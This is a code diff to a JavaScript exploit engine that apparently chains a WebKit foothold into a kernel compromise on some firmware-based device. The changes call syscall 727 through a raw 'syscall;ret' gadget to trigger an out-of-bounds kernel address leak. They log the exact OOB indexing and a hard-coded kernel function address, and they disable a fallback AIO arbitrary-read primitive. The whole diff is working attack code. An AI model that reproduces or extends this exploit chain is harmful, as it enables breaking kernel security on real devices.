@@ -563,8 +563,8 @@ export function makeBagagwaEngine(X) {
     }
 
     async function leakViaDebugInfo(reqId, tableIdx) {
-        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] === undefined) {
-            return { ok: false, why: "syscall 727 (0x2D7) stub not in firmware profile" };
+        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] === undefined && !P.rawSyscall) {
+            return { ok: false, why: "syscall 727 (0x2D7) has no stub and no raw-syscall path" };
         }
 
         const outBuf = safeAlloc(0x100, "aio-debug-leak");
@@ -1278,8 +1278,10 @@ export function makeBagagwaEngine(X) {
 
         note("=== Stage 2: kernel address leak ===");
 
-        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined) {
-            note("syscall 727 (0x2D7) stub available — get_aio_debug_request_info @ 0x805c3090");
+        if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined || P.rawSyscall) {
+            note("syscall 727 (0x2D7) " + (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined
+                ? "stub available" : "called via RAW path (WebKit syscall;ret)") +
+                " — get_aio_debug_request_info @ 0x805c3090");
             note("OOB: source idx = (req_id>>16)+edx scaled by 0x28 into [rax+0x20]");
             for (let tIdx = 0; tIdx < LEAK_ATTEMPTS; tIdx++) {
                 for (let i = 0; i < S.aioRequests.length; i++) {
@@ -1314,9 +1316,9 @@ export function makeBagagwaEngine(X) {
         // route (IPv6 rthdr + evf aliasing) or the waker. Gate it here so the
         // log tells us which route to build before the port.
         try { await probeLapseSurface(); } catch (_) {}
-        // The AIO write-as-read primitive needs none of the burned/missing
-        // surface; it is the actual leak. Probe it too.
-        try { await probeAioArbRead(); } catch (_) {}
+        // AIO write-as-read is a fallback whose socket read can block and wedge
+        // the chain; disabled now that 727 (raw path) is the primary leak.
+        // try { await probeAioArbRead(); } catch (_) {}
 
         const pr = await setupPipes();
         if (!pr.ok) { out.why = pr.why; return out; }
